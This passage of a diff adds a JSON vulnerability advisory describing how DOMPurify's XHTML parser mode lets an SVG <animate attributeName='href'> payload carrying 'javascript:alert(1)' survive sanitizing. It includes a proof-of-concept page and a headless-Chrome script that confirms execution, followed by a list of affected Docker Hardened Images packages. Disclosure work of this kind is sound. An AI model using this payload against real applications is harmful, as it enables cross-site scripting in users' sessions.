@@ -1,0 +1,1202 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-g2qx-syoq-rb6m-uplm",
+  "modified": "2026-11-11T19:31:02Z",
+  "published": "2026-11-11T19:31:02Z",
+  "upstream": [
+    "GHSA-c6gr-qvv4-5v3f"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\n\nDOMPurify drops `attributeName` attributes whose value contains `href`, so an allowed `<animate>` or `<set>` can't rewrite a link's href after sanitizing. The check compares the attribute name after `transformCaseFunc`, and that function doesn't lowercase in XHTML mode. In XHTML the attribute is spelled `attributeName`, so the comparison with `\"attributename\"` never matches and the guard does nothing.\n\nAn app that uses `PARSER_MEDIA_TYPE: 'application/xhtml+xml'` and allows `animate` and `attributeName` will keep `<animate attributeName=\"href\" values=\"x;javascript:alert(1)\">`. Clicking the parent link then runs the script.\n\nThis needs a non-default config, so going by SECURITY.md, this is a hardening bug rather than a bypass of the default config.\n\n### Details\n\nIn `_sanitizeAttributes` (dist/purify.js line 2216 in 3.4.16):\n\n```js\nconst lcName = transformCaseFunc(name);\n...\nif (lcName === \"attributename\" && stringMatch(value, \"href\")) {\n  _removeAttribute(name, currentNode, attr);\n  continue;\n}\n```\n\n`transformCaseFunc` is `stringToLowerCase` for text/html but the identity function for application/xhtml+xml, because XML names are case-sensitive. The XML parser keeps SVG's real name `attributeName`, so in XHTML mode `lcName` is `attributeName` and the branch never runs.\n\nPeople using XHTML mode have to list SVG attributes in camelCase. The built-in attribute lists are lowercase and won't match, so `ALLOWED_ATTR`/`ADD_ATTR: ['attributeName', ...]` is the config you'd naturally write here.\n\nThe value also passes the URI check. `IS_ALLOWED_URI` only checks the start of the string, and `x;javascript:alert(1)` looks like a relative value. SMIL reads `values` as a `;` list and, with `fill=\"freeze\"`, the last entry ends up as the effective href of the parent `<a>`.\n\nIn text/html mode the same allowlist is handled correctly. The name is lowercased and `attributeName` is removed.\n\nThis is close to the XHTML case-sensitivity hardening in 3.4.14/3.4.15 (Attack Classes & Bypass History §22): a check written for lowercase names that a case-preserved name gets past.\n\n### Proof of concept\n\nTested with DOMPurify 3.4.16 in Chrome 153 (headless shell). Also reproduced on 3.3.3, 3.3.1 and 3.2.7. Not confirmed for 2.x.\n\nConfig:\n\n```js\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\n```\n\n`{ PARSER_MEDIA_TYPE: 'application/xhtml+xml', USE_PROFILES: { svg: true }, ADD_TAGS: ['animate'], ADD_ATTR: ['attributeName'] }` behaves the same.\n\nInput:\n\n```html\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>\n```\n\nSteps:\n\n1. Save this as `poc.xhtml` next to `purify.js` (3.4.16) and open it in Chrome. The `.xhtml` extension makes Chrome load it as application/xhtml+xml, so nothing moves between HTML and XHTML.\n\n```html\n<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>\n<script src=\"purify.js\"></script></head><body><div id=\"sink\"></div>\n<script>//<![CDATA[\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\nconst dirty = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nconst clean = DOMPurify.sanitize(dirty, cfg);\nconsole.log(clean);\ndocument.getElementById('sink').innerHTML = clean;\n//]]></script></body></html>\n```\n\n2. The logged output still contains `attributeName=\"href\"` and `values=\"x;javascript:alert(1)\"`.\n3. `document.getElementById('q').href.animVal` returns `\"javascript:alert(1)\"`.\n4. Click \"click\" and `alert(1)` runs.\n\nAs a control, remove `PARSER_MEDIA_TYPE` and change the allowlist entry to `attributename`. The output then loses `attributeName`, `href.animVal` is `\"\"`, and clicking does nothing. The same XHTML-mode output also runs when inserted into a normal text/html page.\n\nAn automated version (fetches a given version from npm, clicks via CDP, checks for the dialog, runs the control) is below.\n\n<details>\n<summary>poc.sh</summary>\n\n```bash\n#!/usr/bin/env bash\n# PoC: DOMPurify SMIL attributeName=href guard bypass in XHTML parser mode.\n#\n# Sanitizes an SVG payload with a PARSER_MEDIA_TYPE:\"application/xhtml+xml\"\n# config that allow-lists <animate> + attributeName, renders the output into\n# div.innerHTML in headless Chromium, clicks the link with a trusted (CDP) mouse\n# event and reports whether alert() fired. Also runs the same allowlist in\n# text/html mode as a control (DOMPurify strips attributeName there).\n#\n# usage:  ./poc.sh [dompurify-version]          (default 3.4.16, fetched via `npm pack`)\n#         DOMPURIFY_JS=/path/to/purify.js ./poc.sh\n#         CHROME=/path/to/chrome ./poc.sh\n# needs:  node >= 18, npm (unless DOMPURIFY_JS is set), a Chromium/Chrome binary.\n# exit:   0 = vulnerable (alert fired in xhtml mode), 1 = not vulnerable, 2 = setup error\nset -euo pipefail\nVER=\"${1:-3.4.16}\"\nWORK=\"$(mktemp -d)\"\ntrap 'rm -rf \"$WORK\"' EXIT\n\nif [ -z \"${DOMPURIFY_JS:-}\" ]; then\n  (cd \"$WORK\" && npm pack \"dompurify@$VER\" --silent >/dev/null 2>&1 && tar xzf dompurify-*.tgz) || { echo \"npm pack dompurify@$VER failed\" >&2; exit 2; }\n  DOMPURIFY_JS=\"$WORK/package/dist/purify.js\"\nfi\nif [ -z \"${CHROME:-}\" ]; then\n  for c in \"$HOME\"/.cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell \\\n           \"$HOME\"/.cache/ms-playwright/chromium-*/chrome-linux/chrome \\\n           \"$(command -v google-chrome || true)\" \"$(command -v chromium || true)\" \"$(command -v chromium-browser || true)\"; do\n    [ -n \"$c\" ] && [ -x \"$c\" ] && CHROME=\"$c\" && break\n  done\nfi\n[ -n \"${CHROME:-}\" ] || { echo \"no Chrome/Chromium found; set CHROME=\" >&2; exit 2; }\n\ncat > \"$WORK/poc.html\" <<'EOF'\n<!doctype html><meta charset=\"utf-8\"><title>poc</title>\n<script src=\"purify.js\"></script>\n<div id=\"sink\"></div>\n<script>//<![CDATA[\nconst payload = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\">' +\n  '<a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/>' +\n  '<text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nfunction run(mode) {\n  const cfg = {\n    ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n    ALLOWED_ATTR: [mode === 'xhtml' ? 'attributeName' : 'attributename', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n  };\n  if (mode === 'xhtml') cfg.PARSER_MEDIA_TYPE = 'application/xhtml+xml';\n  const clean = DOMPurify.sanitize(payload, cfg);\n  document.getElementById('sink').innerHTML = clean;\n  return clean;\n}\n//]]></script>\nEOF\ncp \"$DOMPURIFY_JS\" \"$WORK/purify.js\"\n# Same test inside a real XHTML document (no HTML<->XHTML context flip):\n# the page is parsed as application/xhtml+xml and the sink's innerHTML uses the XML fragment parser.\nsed -e 's#<!doctype html><meta charset=\"utf-8\"><title>poc</title>#<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>#' \\\n    -e 's#<script src=\"purify.js\"></script>#<script src=\"purify.js\"></script></head><body>#' \\\n    -e 's#^</script>$#</script></body></html>#' \"$WORK/poc.html\" > \"$WORK/poc.xhtml\"\n\ncat > \"$WORK/drive.js\" <<'EOF'\n// zero-dependency CDP driver over --remote-debugging-pipe\nconst { spawn } = require('child_process');\nconst [chrome, url, dir] = process.argv.slice(2);\nconst xurl = url.replace(/\\.html$/, '.xhtml');\nconst p = spawn(chrome, ['--headless', '--no-sandbox', '--remote-debugging-pipe', '--disable-gpu', '--no-first-run',\n  `--user-data-dir=${dir}/profile`, 'about:blank'], { stdio: ['ignore', 'ignore', 'ignore', 'pipe', 'pipe'] });\nlet id = 0, buf = ''; const pend = new Map(), dialogs = [];\np.stdio[4].on('data', (d) => {\n  buf += d; let i;\n  while ((i = buf.indexOf('\\0')) >= 0) {\n    const m = JSON.parse(buf.slice(0, i)); buf = buf.slice(i + 1);\n    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }\n    else if (m.method === 'Page.javascriptDialogOpening') {\n      dialogs.push(m.params.message);\n      send('Page.handleJavaScriptDialog', { accept: true }, m.sessionId);\n    }\n  }\n});\nfunction send(method, params = {}, sessionId) {\n  return new Promise((r) => { const n = ++id; pend.set(n, r); p.stdio[3].write(JSON.stringify({ id: n, method, params, sessionId }) + '\\0'); });\n}\nconst sleep = (ms) => new Promise((r) => setTimeout(r, ms));\n(async () => {\n  const { result: { targetId } } = await send('Target.createTarget', { url: 'about:blank' });\n  const { result: { sessionId: s } } = await send('Target.attachToTarget', { targetId, flatten: true });\n  await send('Page.enable', {}, s); await send('Runtime.enable', {}, s);\n  const ev = async (e) => (await send('Runtime.evaluate', { expression: e, returnByValue: true, awaitPromise: true }, s)).result.result.value;\n  let vulnerable = false, xhtmlDoc = false;\n  const ver = async () => ev('DOMPurify.version');\n  for (const [mode, page] of [['html', url], ['xhtml', url], ['xhtml', xurl]]) {\n    await send('Page.navigate', { url: page }, s); await sleep(500);\n    const docType = await ev('document.contentType');\n    if (mode === 'html') console.log('DOMPurify', await ver(), '/', await ev('navigator.userAgent.match(/Chrome\\\\/[\\\\d.]+/)[0]'));\n    dialogs.length = 0;\n    const clean = await ev(`run(${JSON.stringify(mode)})`);\n    await sleep(400); // let the 0.01s animation apply (fill=freeze)\n    const href = await ev(`(()=>{const a=document.getElementById('q');return a?a.href.animVal:null})()`);\n    const box = await ev(`(()=>{const t=document.querySelector('#sink text');if(!t)return null;const r=t.getBoundingClientRect();return [r.x+r.width/2,r.y+r.height/2]})()`);\n    if (box) for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased'])\n      await send('Input.dispatchMouseEvent', { type, x: box[0], y: box[1], button: 'left', clickCount: 1 }, s);\n    await sleep(800);\n    console.log(`\\n[${mode} mode, sink document ${docType}] sanitized output:\\n  ${clean}`);\n    console.log(`  animated <a> href (animVal): ${JSON.stringify(href)}`);\n    console.log(`  alert() fired on click: ${dialogs.length ? 'YES ' + JSON.stringify(dialogs) : 'no'}`);\n    if (mode === 'xhtml' && dialogs.length) vulnerable = true;\n    if (mode === 'xhtml' && docType === 'application/xhtml+xml') xhtmlDoc = dialogs.length > 0;\n  }\n  console.log(vulnerable ? `\\nRESULT: VULNERABLE (javascript: executed in XHTML mode; pure-XHTML document sink: ${xhtmlDoc ? 'also executes' : 'no'})` : '\\nRESULT: not vulnerable');\n  p.kill('SIGKILL'); process.exit(vulnerable ? 0 : 1);\n})().catch((e) => { console.error(e); p.kill('SIGKILL'); process.exit(2); });\nEOF\nnode \"$WORK/drive.js\" \"$CHROME\" \"file://$WORK/poc.html\" \"$WORK\"\n```\n\n</details>\n\n### Impact\n\nStored or reflected XSS on a click. It affects apps that sanitize SVG in XHTML mode and allow `animate` (or `set`) with `attributeName`, for example to keep simple SVG animations. Script runs in the app's origin when a user clicks the sanitized link. Default configs and text/html mode aren't affected.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "argocd-3.3-dev",
+        "purl": "pkg:apk/dhi/argocd-3.3-dev"
+      },
+      "versions": [
+        "3.3.14-r1",
+        "3.3.14-r2",
+        "3.3.14-r3",
+        "3.3.14-r4",
+        "3.3.14-r5",
+        "3.3.14-r6",
+        "3.3.14-r7",
+        "3.3.14-r8",
+        "3.3.14-r9",
+        "3.3.15-r0",
+        "3.3.15-r1",
+        "3.3.16-r0",
+        "3.3.16-r1",
+        "3.3.17-r0",
+        "3.3.17-r1",
+        "3.3.17-r2",
+        "3.3.18-r0",
+        "3.3.18-r1",
+        "3.3.18-r2",
+        "3.3.18-r3",
+        "3.3.18-r4",
+        "3.3.19-r0",
+        "3.3.19-r1",
+        "3.3.19-r2",
+        "3.3.19-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "argocd-3.3",
+        "purl": "pkg:apk/dhi/argocd-3.3"
+      },
+      "versions": [
+        "3.3.14-r1",
+        "3.3.14-r2",
+        "3.3.14-r3",
+        "3.3.14-r4",
+        "3.3.14-r5",
+        "3.3.14-r6",
+        "3.3.14-r7",
+        "3.3.14-r8",
+        "3.3.14-r9",
+        "3.3.15-r0",
+        "3.3.15-r1",
+        "3.3.16-r0",
+        "3.3.16-r1",
+        "3.3.17-r0",
+        "3.3.17-r1",
+        "3.3.17-r2",
+        "3.3.18-r0",
+        "3.3.18-r1",
+        "3.3.18-r2",
+        "3.3.18-r3",
+        "3.3.18-r4",
+        "3.3.19-r0",
+        "3.3.19-r1",
+        "3.3.19-r2",
+        "3.3.19-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "argocd-3.4-dev",
+        "purl": "pkg:apk/dhi/argocd-3.4-dev"
+      },
+      "versions": [
+        "3.4.10-r0",
+        "3.4.10-r1",
+        "3.4.11-r0",
+        "3.4.11-r1",
+        "3.4.12-r0",
+        "3.4.12-r1",
+        "3.4.12-r2",
+        "3.4.12-r3",
+        "3.4.12-r4",
+        "3.4.12-r5",
+        "3.4.12-r6",
+        "3.4.12-r7",
+        "3.4.13-r0",
+        "3.4.13-r1",
+        "3.4.13-r2",
+        "3.4.13-r3",
+        "3.4.7-r1",
+        "3.4.7-r2",
+        "3.4.8-r0",
+        "3.4.8-r1",
+        "3.4.8-r2",
+        "3.4.8-r3",
+        "3.4.8-r4",
+        "3.4.8-r5",
+        "3.4.8-r6",
+        "3.4.9-r0",
+        "3.4.9-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "argocd-3.4",
+        "purl": "pkg:apk/dhi/argocd-3.4"
+      },
+      "versions": [
+        "3.4.10-r0",
+        "3.4.10-r1",
+        "3.4.11-r0",
+        "3.4.11-r1",
+        "3.4.12-r0",
+        "3.4.12-r1",
+        "3.4.12-r2",
+        "3.4.12-r3",
+        "3.4.12-r4",
+        "3.4.12-r5",
+        "3.4.12-r6",
+        "3.4.12-r7",
+        "3.4.13-r0",
+        "3.4.13-r1",
+        "3.4.13-r2",
+        "3.4.13-r3",
+        "3.4.7-r1",
+        "3.4.7-r2",
+        "3.4.8-r0",
+        "3.4.8-r1",
+        "3.4.8-r2",
+        "3.4.8-r3",
+        "3.4.8-r4",
+        "3.4.8-r5",
+        "3.4.8-r6",
+        "3.4.9-r0",
+        "3.4.9-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "argocd-3.5-dev",
+        "purl": "pkg:apk/dhi/argocd-3.5-dev"
+      },
+      "versions": [
+        "3.5.1-r1",
+        "3.5.1-r2",
+        "3.5.2-r0",
+        "3.5.2-r1",
+        "3.5.2-r2",
+        "3.5.2-r3",
+        "3.5.2-r4",
+        "3.5.2-r5",
+        "3.5.3-r0",
+        "3.5.3-r1",
+        "3.5.4-r0",
+        "3.5.4-r1",
+        "3.5.5-r0",
+        "3.5.5-r1",
+        "3.5.6-r0",
+        "3.5.6-r1",
+        "3.5.6-r2",
+        "3.5.6-r3",
+        "3.5.6-r4",
+        "3.5.6-r5",
+        "3.5.6-r6",
+        "3.5.6-r7",
+        "3.5.7-r0",
+        "3.5.7-r1",
+        "3.5.7-r2",
+        "3.5.7-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "argocd-3.5",
+        "purl": "pkg:apk/dhi/argocd-3.5"
+      },
+      "versions": [
+        "3.5.1-r1",
+        "3.5.1-r2",
+        "3.5.2-r0",
+        "3.5.2-r1",
+        "3.5.2-r2",
+        "3.5.2-r3",
+        "3.5.2-r4",
+        "3.5.2-r5",
+        "3.5.3-r0",
+        "3.5.3-r1",
+        "3.5.4-r0",
+        "3.5.4-r1",
+        "3.5.5-r0",
+        "3.5.5-r1",
+        "3.5.6-r0",
+        "3.5.6-r1",
+        "3.5.6-r2",
+        "3.5.6-r3",
+        "3.5.6-r4",
+        "3.5.6-r5",
+        "3.5.6-r6",
+        "3.5.6-r7",
+        "3.5.7-r0",
+        "3.5.7-r1",
+        "3.5.7-r2",
+        "3.5.7-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "codecov-frontend",
+        "purl": "pkg:apk/dhi/codecov-frontend"
+      },
+      "versions": [
+        "26.7.6-r0",
+        "26.7.6-r1",
+        "26.7.6-r2",
+        "26.7.6-r3",
+        "26.7.6-r4",
+        "26.7.6-r5"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "gitea-dev",
+        "purl": "pkg:apk/dhi/gitea-dev"
+      },
+      "versions": [
+        "1.26.4-r1",
+        "1.27.0-r1",
+        "1.27.0-r2",
+        "1.27.1-r0",
+        "1.27.1-r1",
+        "1.27.1-r2",
+        "1.27.1-r3",
+        "1.27.2-r0",
+        "1.27.2-r1",
+        "1.27.2-r2",
+        "1.27.2-r3",
+        "1.27.2-r4",
+        "1.27.3-r0",
+        "1.27.3-r1",
+        "1.27.3-r10",
+        "1.27.3-r11",
+        "1.27.3-r12",
+        "1.27.3-r13",
+        "1.27.3-r14",
+        "1.27.3-r15",
+        "1.27.3-r16",
+        "1.27.3-r17",
+        "1.27.3-r18",
+        "1.27.3-r19",
+        "1.27.3-r2",
+        "1.27.3-r3",
+        "1.27.3-r4",
+        "1.27.3-r5",
+        "1.27.3-r7",
+        "1.27.3-r8",
+        "1.27.3-r9",
+        "28.3.0-r0",
+        "28.3.0-r1",
+        "28.3.0-r2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "gitea-fips-dev",
+        "purl": "pkg:apk/dhi/gitea-fips-dev"
+      },
+      "versions": [
+        "1.26.4-r1",
+        "1.27.0-r1",
+        "1.27.0-r2",
+        "1.27.1-r0",
+        "1.27.1-r1",
+        "1.27.1-r2",
+        "1.27.1-r3",
+        "1.27.2-r0",
+        "1.27.2-r1",
+        "1.27.2-r2",
+        "1.27.2-r3",
+        "1.27.2-r4",
+        "1.27.3-r0",
+        "1.27.3-r1",
+        "1.27.3-r10",
+        "1.27.3-r11",
+        "1.27.3-r12",
+        "1.27.3-r13",
+        "1.27.3-r14",
+        "1.27.3-r15",
+        "1.27.3-r16",
+        "1.27.3-r17",
+        "1.27.3-r18",
+        "1.27.3-r19",
+        "1.27.3-r2",
+        "1.27.3-r3",
+        "1.27.3-r4",
+        "1.27.3-r5",
+        "1.27.3-r7",
+        "1.27.3-r8",
+        "1.27.3-r9",
+        "28.3.0-r0",
+        "28.3.0-r1",
+        "28.3.0-r2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "gitea-fips",
+        "purl": "pkg:apk/dhi/gitea-fips"
+      },
+      "versions": [
+        "1.26.4-r1",
+        "1.27.0-r1",
+        "1.27.0-r2",
+        "1.27.1-r0",
+        "1.27.1-r1",
+        "1.27.1-r2",
+        "1.27.1-r3",
+        "1.27.2-r0",
+        "1.27.2-r1",
+        "1.27.2-r2",
+        "1.27.2-r3",
+        "1.27.2-r4",
+        "1.27.3-r0",
+        "1.27.3-r1",
+        "1.27.3-r10",
+        "1.27.3-r11",
+        "1.27.3-r12",
+        "1.27.3-r13",
+        "1.27.3-r14",
+        "1.27.3-r15",
+        "1.27.3-r16",
+        "1.27.3-r17",
+        "1.27.3-r18",
+        "1.27.3-r19",
+        "1.27.3-r2",
+        "1.27.3-r3",
+        "1.27.3-r4",
+        "1.27.3-r5",
+        "1.27.3-r7",
+        "1.27.3-r8",
+        "1.27.3-r9",
+        "28.3.0-r0",
+        "28.3.0-r1",
+        "28.3.0-r2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "gitea",
+        "purl": "pkg:apk/dhi/gitea"
+      },
+      "versions": [
+        "1.26.4-r1",
+        "1.27.0-r1",
+        "1.27.0-r2",
+        "1.27.1-r0",
+        "1.27.1-r1",
+        "1.27.1-r2",
+        "1.27.1-r3",
+        "1.27.2-r0",
+        "1.27.2-r1",
+        "1.27.2-r2",
+        "1.27.2-r3",
+        "1.27.2-r4",
+        "1.27.3-r0",
+        "1.27.3-r1",
+        "1.27.3-r10",
+        "1.27.3-r11",
+        "1.27.3-r12",
+        "1.27.3-r13",
+        "1.27.3-r14",
+        "1.27.3-r15",
+        "1.27.3-r16",
+        "1.27.3-r17",
+        "1.27.3-r18",
+        "1.27.3-r19",
+        "1.27.3-r2",
+        "1.27.3-r3",
+        "1.27.3-r4",
+        "1.27.3-r5",
+        "1.27.3-r7",
+        "1.27.3-r8",
+        "1.27.3-r9",
+        "28.3.0-r0",
+        "28.3.0-r1",
+        "28.3.0-r2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "kiali-server-dev",
+        "purl": "pkg:apk/dhi/kiali-server-dev"
+      },
+      "versions": [
+        "2.30.0-r1",
+        "2.31.0-r0",
+        "2.31.0-r1",
+        "2.31.0-r2",
+        "2.31.0-r3",
+        "2.31.0-r4",
+        "2.32.0-r0",
+        "2.32.0-r1",
+        "2.32.0-r2",
+        "2.32.0-r3",
+        "2.33.0-r0",
+        "2.33.0-r1",
+        "2.33.0-r2",
+        "2.33.0-r3",
+        "2.33.0-r4",
+        "2.33.0-r5",
+        "2.33.0-r6",
+        "2.34.0-r0",
+        "2.34.0-r1",
+        "2.34.1-r0",
+        "2.34.1-r1",
+        "2.34.1-r2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "kiali-server-fips-dev",
+        "purl": "pkg:apk/dhi/kiali-server-fips-dev"
+      },
+      "versions": [
+        "2.30.0-r1",
+        "2.31.0-r0",
+        "2.31.0-r1",
+        "2.31.0-r2",
+        "2.31.0-r3",
+        "2.31.0-r4",
+        "2.32.0-r0",
+        "2.32.0-r1",
+        "2.32.0-r2",
+        "2.32.0-r3",
+        "2.33.0-r0",
+        "2.33.0-r1",
+        "2.33.0-r2",
+        "2.33.0-r3",
+        "2.33.0-r4",
+        "2.33.0-r5",
+        "2.33.0-r6",
+        "2.34.0-r0",
+        "2.34.0-r1",
+        "2.34.1-r0",
+        "2.34.1-r1",
+        "2.34.1-r2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "kiali-server-fips",
+        "purl": "pkg:apk/dhi/kiali-server-fips"
+      },
+      "versions": [
+        "2.30.0-r1",
+        "2.31.0-r0",
+        "2.31.0-r1",
+        "2.31.0-r2",
+        "2.31.0-r3",
+        "2.31.0-r4",
+        "2.32.0-r0",
+        "2.32.0-r1",
+        "2.32.0-r2",
+        "2.32.0-r3",
+        "2.33.0-r0",
+        "2.33.0-r1",
+        "2.33.0-r2",
+        "2.33.0-r3",
+        "2.33.0-r4",
+        "2.33.0-r5",
+        "2.33.0-r6",
+        "2.34.0-r0",
+        "2.34.0-r1",
+        "2.34.1-r0",
+        "2.34.1-r1",
+        "2.34.1-r2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "kiali-server",
+        "purl": "pkg:apk/dhi/kiali-server"
+      },
+      "versions": [
+        "2.30.0-r1",
+        "2.31.0-r0",
+        "2.31.0-r1",
+        "2.31.0-r2",
+        "2.31.0-r3",
+        "2.31.0-r4",
+        "2.32.0-r0",
+        "2.32.0-r1",
+        "2.32.0-r2",
+        "2.32.0-r3",
+        "2.33.0-r0",
+        "2.33.0-r1",
+        "2.33.0-r2",
+        "2.33.0-r3",
+        "2.33.0-r4",
+        "2.33.0-r5",
+        "2.33.0-r6",
+        "2.34.0-r0",
+        "2.34.0-r1",
+        "2.34.1-r0",
+        "2.34.1-r1",
+        "2.34.1-r2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "llama-cpp-0",
+        "purl": "pkg:apk/dhi/llama-cpp-0"
+      },
+      "versions": [
+        "0.7.0-r1",
+        "0.7.0-r2",
+        "0.7.0-r3",
+        "0.7.0-r4",
+        "0.7.0-r5",
+        "0.7.0-r6",
+        "0.7.0-r7",
+        "0.8.0-r0",
+        "0.8.0-r1",
+        "0.9.0-r0",
+        "0.9.0-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "metabase",
+        "purl": "pkg:apk/dhi/metabase"
+      },
+      "versions": [
+        "0.63.16.9-r0",
+        "0.63.17.3-r0",
+        "0.63.18-r0",
+        "0.63.18.1-r0",
+        "0.63.18.2-r0",
+        "0.63.18.4-r0",
+        "0.63.18.5-r0",
+        "0.63.19-r0",
+        "0.63.19.1-r0",
+        "0.63.19.2-r0",
+        "0.63.19.2-r1",
+        "0.64.2.8-r0",
+        "0.64.2.9-r0",
+        "0.64.3.2-r0",
+        "0.64.3.4-r0",
+        "0.64.3.4-r1",
+        "0.64.3.5-r0",
+        "0.64.3.5-r1",
+        "0.65.2.2-r0",
+        "0.65.3.6-r0",
+        "0.65.3.7-r0",
+        "0.65.4-r0",
+        "0.65.4.1-r0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "openshift-console-dev",
+        "purl": "pkg:apk/dhi/openshift-console-dev"
+      },
+      "versions": [
+        "4.22.10-r1",
+        "4.22.10-r2",
+        "4.22.12-r1",
+        "4.22.13-r0",
+        "4.22.13-r1",
+        "4.22.14-r0",
+        "4.22.15-r0",
+        "4.22.15-r1",
+        "4.22.15-r2",
+        "4.22.16-r0",
+        "4.22.16-r1",
+        "4.22.16-r2",
+        "4.22.17-r0",
+        "4.22.17-r1",
+        "4.22.17-r2",
+        "4.22.19-r0",
+        "4.22.19-r1",
+        "4.22.22-r0",
+        "4.22.22-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "openshift-console-fips-dev",
+        "purl": "pkg:apk/dhi/openshift-console-fips-dev"
+      },
+      "versions": [
+        "4.22.10-r1",
+        "4.22.10-r2",
+        "4.22.12-r1",
+        "4.22.13-r0",
+        "4.22.13-r1",
+        "4.22.14-r0",
+        "4.22.15-r0",
+        "4.22.15-r1",
+        "4.22.15-r2",
+        "4.22.16-r0",
+        "4.22.16-r1",
+        "4.22.16-r2",
+        "4.22.17-r0",
+        "4.22.17-r1",
+        "4.22.17-r2",
+        "4.22.19-r0",
+        "4.22.19-r1",
+        "4.22.22-r0",
+        "4.22.22-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "openshift-console-fips",
+        "purl": "pkg:apk/dhi/openshift-console-fips"
+      },
+      "versions": [
+        "4.22.10-r1",
+        "4.22.10-r2",
+        "4.22.12-r1",
+        "4.22.13-r0",
+        "4.22.13-r1",
+        "4.22.14-r0",
+        "4.22.15-r0",
+        "4.22.15-r1",
+        "4.22.15-r2",
+        "4.22.16-r0",
+        "4.22.16-r1",
+        "4.22.16-r2",
+        "4.22.17-r0",
+        "4.22.17-r1",
+        "4.22.17-r2",
+        "4.22.19-r0",
+        "4.22.19-r1",
+        "4.22.22-r0",
+        "4.22.22-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "openshift-console",
+        "purl": "pkg:apk/dhi/openshift-console"
+      },
+      "versions": [
